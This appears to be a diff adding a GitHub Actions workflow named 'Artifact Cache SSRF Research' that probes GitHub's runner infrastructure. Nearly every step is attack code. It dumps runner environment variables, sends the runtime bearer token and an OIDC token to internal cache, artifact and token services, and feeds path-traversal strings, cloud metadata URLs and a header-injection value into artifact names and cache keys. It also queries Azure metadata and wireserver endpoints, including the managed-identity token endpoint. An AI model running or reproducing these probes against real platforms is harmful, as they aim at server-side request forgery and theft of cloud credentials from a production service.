@@ -1,0 +1,241 @@
+name: Artifact Cache SSRF Research
+
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+  id-token: write
+
+jobs:
+  probe-endpoints:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Dump all ACTIONS environment variables
+        run: |
+          echo "=== ACTIONS ENVIRONMENT VARIABLES ==="
+          env | grep -i ACTIONS | sort
+          echo ""
+          echo "=== GITHUB ENVIRONMENT VARIABLES ==="
+          env | grep -i GITHUB | sort
+          echo ""
+          echo "=== RUNNER ENVIRONMENT VARIABLES ==="
+          env | grep -i RUNNER | sort
+
+      - name: Probe Cache Service endpoints
+        run: |
+          echo "=== CACHE SERVICE PROBING ==="
+          CACHE_URL="${ACTIONS_CACHE_URL:-$ACTIONS_RESULTS_URL}"
+          echo "Cache URL: $CACHE_URL"
+          
+          # Try to enumerate cache API
+          TOKEN="$ACTIONS_RUNTIME_TOKEN"
+          
+          echo "--- Testing cache API endpoints ---"
+          for endpoint in \
+            "_apis/artifactcache/caches" \
+            "_apis/artifactcache/cache" \
+            "_apis/artifactcache/artifacts" \
+            "twirp/github.actions.results.api.v1.CacheService/GetCache" \
+            "twirp/github.actions.results.api.v1.CacheService/ListCaches"; do
+            echo "Testing: $CACHE_URL$endpoint"
+            curl -s -w "\nHTTP %{http_code}\n" -H "Authorization: Bearer $TOKEN" \
+              -H "Accept: application/json" \
+              "$CACHE_URL$endpoint" 2>&1 | head -20
+            echo "---"
+          done
+
+      - name: Probe Results Service (Artifacts)
+        run: |
+          echo "=== RESULTS SERVICE PROBING ==="
+          RESULTS_URL="$ACTIONS_RESULTS_URL"
+          TOKEN="$ACTIONS_RUNTIME_TOKEN"
+          
+          echo "Results URL: $RESULTS_URL"
+          
+          # Twirp endpoints for artifacts
+          for method in \
+            "CreateArtifact" \
+            "GetSignedArtifactURL" \
+            "ListArtifacts" \
+            "FinalizeArtifact" \
+            "DeleteArtifact"; do
+            echo "Testing: twirp/github.actions.results.api.v1.ArtifactService/$method"
+            curl -s -w "\nHTTP %{http_code}\n" \
+              -X POST \
+              -H "Authorization: Bearer $TOKEN" \
+              -H "Content-Type: application/json" \
+              -d '{}' \
+              "$RESULTS_URL/twirp/github.actions.results.api.v1.ArtifactService/$method" 2>&1 | head -10
+            echo "---"
+          done
+
+      - name: Test artifact URL manipulation
+        run: |
+          echo "=== ARTIFACT URL MANIPULATION ==="
+          TOKEN="$ACTIONS_RUNTIME_TOKEN"
+          RESULTS_URL="$ACTIONS_RESULTS_URL"
+          
+          # Try to get signed URL with crafted artifact name
+          echo "--- Testing crafted artifact names ---"
+          for name in \
+            "test" \
+            "../../../etc/passwd" \
+            "http://169.254.169.254/latest/meta-data/" \
+            "//169.254.169.254/latest/meta-data/" \
+            "test?url=http://169.254.169.254/"; do
+            echo "Artifact name: $name"
+            curl -s -X POST \
+              -H "Authorization: Bearer $TOKEN" \
+              -H "Content-Type: application/json" \
+              -d "{\"workflow_run_backend_id\":\"test\",\"workflow_job_run_backend_id\":\"test\",\"name\":\"$name\"}" \
+              "$RESULTS_URL/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact" 2>&1 | head -5
+            echo "---"
+          done
+
+      - name: Test cache key manipulation
+        run: |
+          echo "=== CACHE KEY MANIPULATION ==="
+          CACHE_URL="${ACTIONS_CACHE_URL:-$ACTIONS_RESULTS_URL}"
+          TOKEN="$ACTIONS_RUNTIME_TOKEN"
+          
+          # Try cache lookups with crafted keys
+          for key in \
+            "test-cache" \
+            "http://169.254.169.254/latest/meta-data/" \
+            "../../../etc/passwd" \
+            "test\nX-Forwarded-For: 169.254.169.254"; do
+            echo "Cache key: $key"
+            ENCODED_KEY=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$key'))")
+            curl -s -w "\nHTTP %{http_code}\n" \
+              -H "Authorization: Bearer $TOKEN" \
+              -H "Accept: application/json;api-version=6.0-preview.1" \
+              "$CACHE_URL/_apis/artifactcache/cache?keys=$ENCODED_KEY&version=test" 2>&1 | head -5
+            echo "---"
+          done
+
+      - name: Probe internal Azure endpoints
+        run: |
+          echo "=== PROBING INTERNAL AZURE ENDPOINTS ==="
+          # The cache/artifact backend is Azure Blob Storage
+          # Check if we can reach Azure internal endpoints
+          
+          for endpoint in \
+            "http://169.254.169.254/metadata/instance?api-version=2021-02-01" \
+            "http://168.63.129.16/machine?comp=goalstate" \
+            "http://168.63.129.16/machine/plugins?comp=config&type=extensions" \
+            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"; do
+            echo "Endpoint: $endpoint"
+            curl -s -m 3 -H "Metadata: true" "$endpoint" 2>&1 | head -5 || echo "timeout/blocked"
+            echo "---"
+          done
+
+  test-cache-restore-ssrf:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      
+      - name: Setup cache with crafted key
+        id: cache-test
+        uses: actions/cache@v4
+        with:
+          path: /tmp/cache-test
+          key: ssrf-test-${{ github.run_id }}-${{ github.run_attempt }}
+          restore-keys: |
+            ssrf-test-
+            http://169.254.169.254/
+        continue-on-error: true
+        
+      - name: Check cache result
+        run: |
+          echo "Cache hit: ${{ steps.cache-test.outputs.cache-hit }}"
+          echo "Cache matched key: ${{ steps.cache-test.outputs.cache-matched-key }}"
+
+  test-artifact-download-ssrf:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Create test artifact
+        run: |
+          mkdir -p /tmp/artifact-test
+          echo "test data" > /tmp/artifact-test/test.txt
+          
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: ssrf-test-artifact-${{ github.run_id }}
+          path: /tmp/artifact-test/
+          
+      - name: Dump artifact URLs
+        run: |
+          echo "=== ARTIFACT URL ANALYSIS ==="
+          TOKEN="$ACTIONS_RUNTIME_TOKEN"
+          RESULTS_URL="$ACTIONS_RESULTS_URL"
+          
+          # Get signed URL for the artifact we just uploaded
+          # This shows what URL format is used for downloads
+          echo "Listing artifacts..."
+          curl -s -X POST \
+            -H "Authorization: Bearer $TOKEN" \
+            -H "Content-Type: application/json" \
+            -d '{"workflow_run_backend_id":"'$GITHUB_RUN_ID'","workflow_job_run_backend_id":"test"}' \
+            "$RESULTS_URL/twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts" 2>&1
+
+  oidc-to-internal-services:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Get OIDC token and probe internal services
+        uses: actions/github-script@v7
+        with:
+          script: |
+            // Get standard OIDC token
+            const token = await core.getIDToken();
+            console.log("OIDC Token (truncated):", token.substring(0, 100) + "...");
+            
+            // Decode and analyze
+            const parts = token.split('.');
+            const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
+            console.log("Token payload:", JSON.stringify(payload, null, 2));
+            
+            // Try to use token against various internal endpoints
+            const endpoints = [
+              'https://vstoken.actions.githubusercontent.com/api/v1',
+              'https://pipelines.actions.githubusercontent.com/',
+              'https://results.actions.githubusercontent.com/',
+              'https://artifactcache.actions.githubusercontent.com/',
+            ];
+            
+            const https = require('https');
+            for (const endpoint of endpoints) {
+              console.log(`\nProbing: ${endpoint}`);
+              try {
+                const res = await fetch(endpoint, {
+                  headers: { 'Authorization': `Bearer ${token}` }
+                });
+                console.log(`Status: ${res.status}`);
+                const text = await res.text();
+                console.log(`Response: ${text.substring(0, 200)}`);
+              } catch (e) {
+                console.log(`Error: ${e.message}`);
+              }
+            }
+
+  runner-registration-probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Probe runner registration endpoints
+        run: |
+          echo "=== RUNNER REGISTRATION ENDPOINTS ==="
+          # These are the endpoints used for self-hosted runner registration
+          # Might have interesting internal services
+          
+          TOKEN="$ACTIONS_RUNTIME_TOKEN"
+          
+          for endpoint in \
+            "https://api.github.com/actions/runner-registration" \
+            "https://pipelines.actions.githubusercontent.com/service-status" \
+            "https://vstoken.actions.githubusercontent.com/.well-known/openid-configuration"; do
+            echo "Endpoint: $endpoint"
+            curl -s -w "\nHTTP %{http_code}\n" -H "Authorization: Bearer $TOKEN" "$endpoint" 2>&1 | head -20
+            echo "---"
+          done
